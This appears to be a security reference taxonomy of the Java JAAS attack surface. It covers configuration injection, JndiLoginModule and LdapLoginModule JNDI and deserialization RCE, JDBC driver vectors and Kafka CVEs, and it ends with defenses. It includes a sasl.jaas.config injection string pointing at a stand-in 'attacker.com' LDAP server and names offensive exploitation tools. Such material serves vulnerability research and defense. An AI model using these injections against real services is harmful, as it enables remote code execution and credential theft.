# JAAS (Java Authentication and Authorization Service) Attack Surface Taxonomy

---
## Classification Structure

JAAS is Java's pluggable authentication and authorization framework. Applications interact with authentication through three core components:

- **LoginContext**: Decouples application code from specific authentication technologies by reading a configuration file (`jaas.config`) to determine which LoginModule(s) to invoke.
- **LoginModule**: Implements the actual authentication logic — LDAP bind, Kerberos ticket validation, JNDI lookup, database credential check, etc.
- **CallbackHandler**: Mediates credential collection between the application and LoginModules, passing user-supplied data (username, password) into the authentication flow.

The fundamental attack surface arises because **JAAS configuration externalizes class loading decisions**: which LoginModule is instantiated, what options it receives, and how its results are interpreted are all determined by configuration that may be influenced by semi-trusted users. When an attacker controls any part of this configuration chain — the LoginModule class name, its options, or the CallbackHandler — they can redirect authentication to trigger JNDI lookups, deserialize untrusted data, or chain multiple modules for file write + code execution.

This taxonomy organizes the JAAS attack surface along three axes:

1. **Axis 1 — Mutation Target (§1-§3)** — Which JAAS component is attacked: configuration injection (§1), LoginModule-specific chains (§2), or CallbackHandler exploitation (§3)
2. **Axis 2 — Exploitation Mechanism** — The underlying vulnerability class leveraged: JNDI injection, deserialization, file write, credential interception
3. **Axis 3 — Attack Scenario** — Real-world impact context: RCE, authentication bypass, credential theft, privilege escalation

This taxonomy is based on the attack surface analysis presented at **Black Hat Europe 2024**: *"A Novel Attack Surface: Java Authentication and Authorization Service (JAAS)"*.

---

## §1. JAAS Configuration Injection

JAAS configuration specifies which LoginModule classes to load and their options. When an attacker can influence this configuration — through system properties, API parameters, or file manipulation — they control the entire authentication pipeline.

### §1-1. System Property and Remote Config Override

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`-D` system property override** | Setting `-Djava.security.auth.login.config=<path>` redirects the JVM to load JAAS configuration from an attacker-controlled file. The `==` (double-equals) syntax overrides ALL other configuration sources. | Access to JVM startup parameters or environment variables |
| **Remote configuration URL** | Setting `login.config.url.N` in `java.security` or via system properties to point to a remote URL (`http://attacker.com/jaas.config`), causing the JVM to fetch and load configuration from an attacker-controlled server | Ability to set security properties; network egress allowed |
| **Programmatic configuration replacement** | Calling `Configuration.setConfiguration()` installs a completely different JAAS configuration at runtime, overwriting any file-based configuration | Untrusted code executing in the same JVM (e.g., malicious plugins, shared hosting) |

### §1-2. LoginModule Class Injection via SASL JAAS Config

The most actively exploited vector: systems that accept `sasl.jaas.config` as a user-controllable property allow direct specification of the LoginModule class and its options.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **JndiLoginModule injection** | Specifying `com.sun.security.auth.module.JndiLoginModule` with `user.provider.url` pointing to an attacker's LDAP/RMI server. During `login()`, the module calls `InitialContext.lookup()` on the untrusted URL, triggering JNDI injection → deserialization RCE. | Attacker controls `sasl.jaas.config` (e.g., Kafka Connect connector creation) |
| **LdapLoginModule injection** | Specifying `com.sun.security.auth.module.LdapLoginModule` with attacker-controlled LDAP server URL. The module deserializes LDAP response attributes, enabling gadget chain execution. | Same as JndiLoginModule; exploitable gadget classes on classpath |
| **ProxyLoginModule bypass** | In application servers with a `ProxyLoginModule` concept (e.g., JBoss/WildFly, Apache Karaf), using the proxy module to indirectly load JndiLoginModule or other dangerous modules, bypassing the blocklist. Note: this is product-specific — Apache Kafka's official mitigation (`org.apache.kafka.disallowed.login.modules`) blocks JndiLoginModule/LdapLoginModule directly and does not document ProxyLoginModule as a bypass vector | ProxyLoginModule available in the target runtime; target module on classpath |

**Example — CVE-2023-25194 (Apache Kafka Connect):**
```
sasl.jaas.config=com.sun.security.auth.module.JndiLoginModule required
  user.provider.url="ldap://attacker.com:1389/Exploit"
  useFirstPass=true;
```

The Kafka Connect worker's `JndiLoginModule.login()` calls `InitialContext.lookup("ldap://attacker.com:1389/Exploit")`, deserializes the LDAP response, and executes attacker-controlled code.

### §1-3. JDBC Driver Configuration Injection

JDBC drivers that support JAAS-based authentication allow configuration injection through connection properties or system properties, creating an indirect path to LoginModule exploitation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Connection property injection** | Some JDBC drivers with Kerberos/SASL support accept properties that influence JAAS configuration (e.g., Hive/Impala `AuthMech` + Kerberos parameters). The exact property names and injection capabilities vary significantly by driver — not all drivers support inline JAAS config specification. | User-controllable JDBC connection URL or properties; driver-specific JAAS integration |

---

## §2. LoginModule Exploitation Techniques

### §2-1. JNDI Lookup RCE (Root Cause)

The root cause of the most critical JAAS attacks: `JndiLoginModule.login()` performs `InitialContext.lookup()` on a user-controlled URL without validation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Direct JNDI lookup** | `JndiLoginModule` reads `user.provider.url` from its options and calls `new InitialContext(env).lookup(url)` during authentication. A malicious LDAP/RMI server returns a serialized object or reference that triggers arbitrary code execution on the client. | Attacker controls `user.provider.url`; network egress to attacker server |
| **LDAP deserialization** | `LdapLoginModule` connects to the specified LDAP server and deserializes response attributes. Even without JNDI reference exploitation, LDAP attribute deserialization can trigger gadget chains (e.g., Commons Collections, Spring) present on the classpath. | Attacker controls LDAP server URL; exploitable gadgets on classpath |
| **Alternative JNDI schemes** | Using `rmi://`, `dns://`, `iiop://`, or `corba://` instead of `ldap://` to bypass scheme-based allowlists while still triggering JNDI lookup and deserialization. | JNDI URL scheme not restricted; alternative protocol handlers available |

### §2-2. Patch Bypass via Module Chaining

When JndiLoginModule is blocklisted (as in Kafka 3.4+), attackers chain multiple LoginModules or use proxy modules to achieve the same effect.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **ProxyLoginModule delegation** | In runtimes that provide `ProxyLoginModule` (e.g., JBoss/WildFly, Apache Karaf), it takes a `login.module.name` option and dynamically loads the specified module. If only `JndiLoginModule` is blocklisted but `ProxyLoginModule` is allowed, the attacker uses it to indirectly load `JndiLoginModule`. This is product-specific — not a generic JAAS or Kafka bypass | ProxyLoginModule available in the target runtime; not in blocklist |
| **Dual-module file write + execution** | Combining two LoginModules in a single JAAS config: the first module generates a log file or output file containing attacker-controlled content (e.g., a webshell), and the second module or a subsequent operation uses that file for code execution. | Two complementary modules available; writable file system path |
| **Custom CallbackHandler abuse** | Specifying a custom or product-specific `CallbackHandler` implementation that reads credentials from a local file. This can potentially be abused to read arbitrary local files by pointing it at sensitive paths. Note: standard JDK JAAS provides `TextCallbackHandler` and `DialogCallbackHandler` — a generic `FileCallbackHandler` is not part of the JDK; this vector applies only to specific product/library implementations that provide such a class | Ability to specify CallbackHandler class; target product provides a file-reading CallbackHandler; target file readable by JVM process |

### §2-3. Custom LoginModule Vulnerabilities

Custom LoginModule implementations in enterprise applications frequently contain insecure patterns.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Fail-open exception handling** | LoginModule catches only `LoginException` but not broader exceptions (`IOException`, `NamingException`). Uncaught exceptions cause the authentication framework to treat the module as "not failed," allowing authentication to succeed without validation. (CVE-2023-25561 pattern — DataHub) | Custom LoginModule with narrow exception handling |
| **Return-false instead of throw** | LoginModule returns `false` from `login()` instead of throwing `LoginException`. When the module's control flag is `optional` or `sufficient`, returning `false` causes the module to be ignored rather than treated as a failure. | Custom LoginModule with incorrect error handling |
| **SQL/LDAP injection in credential lookup** | Custom LoginModule constructs SQL or LDAP queries using unsanitized username/password from CallbackHandler, enabling injection attacks against the authentication backend. | Database-backed or LDAP-backed LoginModule without parameterized queries |

---

## §3. JDBC Driver Attack Surface

Black Hat EU 2024 demonstrated that JDBC drivers represent a significant secondary attack surface for JAAS exploitation, particularly in cloud data platforms.

### §3-1. Vulnerable JDBC Driver Families

| Driver Family | Products | Attack Vector | Key Condition |
|---------------|----------|---------------|---------------|
| **PostgreSQL JDBC** | PostgreSQL, Amazon Redshift, CockroachDB | Connection properties `jaasLogin` and `jaasApplicationName` control GSS/SSPI JAAS authentication entry name; separately, `authenticationPluginClassName` enables arbitrary class instantiation (distinct from JAAS config injection). Note: pgJDBC does not support inline JAAS config injection via connection properties — the JAAS config must be set externally | Attacker controls connection properties; for `authenticationPluginClassName`, target class must be on classpath |
| **Impala JDBC** | Cloudera Impala, AWS EMR | Connection URL accepts `AuthMech=1` (Kerberos) with `KrbAuthType` and JAAS config path, allowing LoginModule injection | Attacker controls connection URL parameters |
| **Hive JDBC** | Apache Hive, Cloudera CDH/CDP, Databricks | Similar Kerberos authentication path with JAAS config injection via connection properties | Attacker controls connection properties |
| **Spark JDBC** | Apache Spark (Thrift Server), AWS Glue, Databricks | Spark's Thrift JDBC interface inherits Hive JDBC driver behavior, propagating JAAS config injection | Attacker controls connection properties via Spark config |

### §3-2. Cloud Service Exploitation Chain

When cloud data platforms accept user-provided JDBC connection strings, the JAAS attack surface extends to cloud infrastructure compromise.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Executor takeover** | Cloud analytics/visualization services accept JDBC connection settings from users. By injecting JAAS config into the connection properties, the attacker achieves RCE on the service's executor (the JVM that runs queries), gaining access to the execution environment. | Cloud service accepts user-provided JDBC connection strings |
| **Cross-datasource access** | After compromising the executor, the attacker accesses credentials and connections to all other data sources configured in the same service instance — not just the attacker's own data. | Executor shares credential store or connection pool across tenants/datasources |
| **SQL-to-RCE via foreign data wrappers** | When a DBMS supports foreign data wrappers (e.g., PostgreSQL FDW) that connect to external databases via JDBC, a SQL statement alone can trigger a JDBC connection with attacker-controlled properties, leading to JAAS config injection and RCE on the database server. | DBMS supports FDW with vulnerable JDBC driver; attacker can execute SQL |

### §3-3. Config Injection via Driver Internals

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Newline injection in config generation** | Some JDBC drivers dynamically generate JAAS config files from connection properties. By injecting newlines and JAAS syntax into a property value, the attacker appends a malicious LoginModule entry (e.g., `JndiLoginModule`) that the JVM loads alongside the legitimate module. | Driver writes unsanitized user input to config file |
| **System property pollution** | Drivers that set `java.security.auth.login.config` from connection parameters affect the entire JVM, meaning one malicious JDBC connection can alter JAAS behavior for all other connections and components in the same process. | Driver sets JVM-wide system properties from per-connection settings |

---

## §4. Integration-Specific Attack Vectors

### §4-1. Apache Kafka Ecosystem

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Kafka Connect connector injection** | Authenticated users with connector create/modify permissions inject `sasl.jaas.config` specifying `JndiLoginModule` with attacker LDAP URL (CVE-2023-25194) | Kafka Connect 2.3.0–3.3.2; connector management access |
| **Kafka Connect override properties** | Using `producer.override.sasl.jaas.config`, `consumer.override.sasl.jaas.config`, or `admin.override.sasl.jaas.config` to inject LoginModule configuration through connector definitions | Kafka Connect with client config overrides enabled |
| **Kafka Broker config alteration** | Authenticated users with `AlterConfigs` ACL modify broker-level SASL JAAS configuration to inject malicious LoginModules (CVE-2025-27819) | Kafka Brokers 2.0.0–3.3.2 (affected); fixed in 3.9.1 / 4.0.0. Note: JndiLoginModule default blocking was introduced in 3.4.0, limiting exploitability in 3.4.0+; AlterConfigs permission required |
| **Downstream propagation (Druid, Flink, etc.)** | Systems that use Kafka client libraries for ingestion inherit the SASL JAAS vulnerability — Apache Druid, Apache Flink, and similar platforms are exploitable through their Kafka ingestion configuration | Platform uses Kafka client with user-controllable SASL config |

### §4-2. Data Platforms

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **DataHub JAAS fail-open** | DataHub's `authenticateJaasUser` catches only `LoginException`; `IOException` from malformed JAAS config bypasses authentication entirely (CVE-2023-25561) | DataHub < 0.8.45 with JAAS authentication |
| **Cloud BI/analytics JDBC injection** | Cloud data visualization and analytics services (Tableau Server, Metabase, Superset, etc.) that accept JDBC connection strings from users create a path from SQL query configuration to JAAS exploitation | Service allows user-provided JDBC connection configuration |

---

## CVE / Vulnerability Mapping

| CVE | Product | Year | Mechanism | Impact | CVSS |
|-----|---------|------|-----------|--------|------|
| CVE-2023-25194 | Apache Kafka Connect | 2023 | SASL JAAS `JndiLoginModule` config injection via connector properties | RCE | 8.8 |
| CVE-2025-27818 | Apache Kafka | 2025 | SASL JAAS `LdapLoginModule` deserialization RCE | RCE | 8.8 |
| CVE-2025-27819 | Apache Kafka Brokers | 2025 | Broker-level SASL JAAS `JndiLoginModule` injection via AlterConfigs | RCE | 8.8 |
| CVE-2023-25561 | DataHub | 2023 | JAAS authentication fail-open via uncaught IOException | Auth Bypass | 5.7 |
| CVE-2014-3612 | Apache ActiveMQ | 2014 | LDAPLoginModule empty password → unauthenticated LDAP bind | Auth Bypass | 7.5 |

---

## Detection Tools

| Tool | Type | Core Technique |
|------|------|---------------|
| **jndi-injection-exploit-kit** | Offensive | Automated JNDI exploitation with HTTP, RMI, and LDAP servers |
| **Metasploit** | Offensive | `exploit/multi/http/apache_druid_cve_2023_25194` for JAAS JNDI injection |
| **Semgrep** | SAST | Static analysis rules for insecure LoginModule patterns (fail-open, unsanitized JNDI URLs) |
| **Jazzer** | Fuzzer | Coverage-guided JVM fuzzing targeting LoginModule implementations |

---

## Defensive Architecture

| Defense | Mechanism | Scope |
|---------|-----------|-------|
| **Disable remote config loading** | Prohibit `login.config.url.N` with remote URLs; restrict `java.security.auth.login.config` to local paths only | JVM-wide |
| **LoginModule allowlisting** | Enforce strict allowlist of permitted LoginModule classes (not just blocklisting `JndiLoginModule`) — reject any module not explicitly approved | Application / framework level |
| **Disable dangerous built-in modules** | Remove or blocklist `JndiLoginModule`, `LdapLoginModule`, `ProxyLoginModule` in production environments | JVM / framework config |
| **Input validation on JAAS config properties** | Validate and sanitize all user-controllable values that flow into JAAS configuration (especially `sasl.jaas.config`, JDBC connection properties) — use allowlists for module names and option keys | API / integration boundary |
| **JDBC connection string hardening** | Restrict JDBC connection properties to an allowlist; prevent users from specifying authentication-related properties (`jaasLogin`, `jaasConfigName`, `AuthMech`, etc.) | Data platform / cloud service |
| **Patch management** | Keep Java runtime, JDBC drivers, Kafka client libraries, and data platform dependencies updated to versions with JAAS-related fixes | Operational |

---

## References

- Black Hat Europe 2024 — *A Novel Attack Surface: Java Authentication and Authorization Service (JAAS)*
- [Oracle JAAS Reference Guide](https://docs.oracle.com/javase/8/docs/technotes/guides/security/jaas/JAASRefGuide.html)
- [CVE-2023-25194 — Apache Kafka Connect SASL JAAS RCE](https://kafka.apache.org/cve-list.html)
- [CVE-2025-27818 — Apache Kafka LdapLoginModule RCE](https://seclists.org/oss-sec/2025/q2/236)
- [CVE-2025-27819 — Apache Kafka Broker JndiLoginModule RCE](https://www.mail-archive.com/dev@kafka.apache.org/msg150246.html)
- [CVE-2023-25561 — DataHub JAAS Authentication Bypass](https://securitylab.github.com/advisories/GHSL-2022-076_GHSL-2022-083_DataHub/)
- [CVE-2014-3612 — ActiveMQ LDAPLoginModule Empty Password](https://www.cvedetails.com/cve/CVE-2014-3612/)
- [Apache Kafka Disallowed Login Modules](https://kafka.apache.org/community/cve-list/)
- [JNDI Injection Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)
